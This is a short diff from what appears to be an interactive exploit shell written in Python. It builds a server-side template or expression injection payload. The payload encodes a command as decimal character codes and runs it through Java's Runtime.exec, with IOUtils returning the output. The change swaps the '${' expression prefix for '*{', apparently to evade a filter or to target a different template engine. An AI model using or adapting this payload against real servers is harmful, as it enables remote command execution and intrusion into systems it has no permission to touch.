@@ -18,7 +18,7 @@ class Terminal(Cmd):
 		for i in command:
 			decimals.append(str(ord(i)))
 
-		payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
+		payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
 		
 
 		for i in decimals[1:]:
